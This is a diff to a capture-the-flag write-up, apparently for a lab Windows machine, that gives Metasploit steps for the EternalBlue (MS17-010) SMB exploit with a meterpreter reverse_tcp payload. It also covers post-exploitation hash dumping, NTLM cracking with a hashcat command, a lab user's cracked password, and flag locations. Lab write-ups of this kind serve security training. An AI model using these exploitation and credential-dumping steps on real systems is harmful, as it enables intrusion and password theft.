@@ -25,18 +25,20 @@
 - Nmap can detect this vulnerability using the script `smb-vuln-ms17-010.nse`
 
 **Metasploit Exploitation Steps**
-1. Search for the exploit: `search ms17-010`
-2. Use the exploit: `use exploit/windows/smb/ms17_010_eternalblue`
-3. Set RHOSTS to the target IP address
-4. Set payload: `set payload windows/x64/meterpreter/reverse_tcp`
-5. Run the exploit: `run`
+1. Search for the exploit: 'search ms17-010'
+2. Use the exploit: 'use exploit/windows/smb/ms17_010_eternalblue'
+3. Set RHOSTS to the target IP address.
+4. Set payload: 'set payload windows/x64/meterpreter/reverse_tcp'
+5. Run the exploit: 'run'
 
 **Post-Exploitation**
-- After getting a regular shell, convert to meterpreter using `post/multi/manage/shell_to_meterpreter`
-- The SESSION option must be set to the current session ID
-- Dump password hashes using `hashdump` command
+- After getting a regular shell, convert to meterpreter using 
+  post/multi/manage/shell_to_meterpreter.
+- The SESSION option must be set to the current session ID.
+- Dump password hashes using hashdump command.
 - Crack NTLM hashes with Hashcat or online tools using hashcat giving it hash file and a wordlist.
-- Jon's hash `ffb43f0de35be4d9917ac0cc8ad57f8d` cracks to password `alqfna22`
+  hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt.
+- Jon's hash `ffb43f0de35be4d9917ac0cc8ad57f8d` cracks to password 'alqfna22'.
 
 **Flag Locations**
 - Flag 1: Located in the system root (C:\)
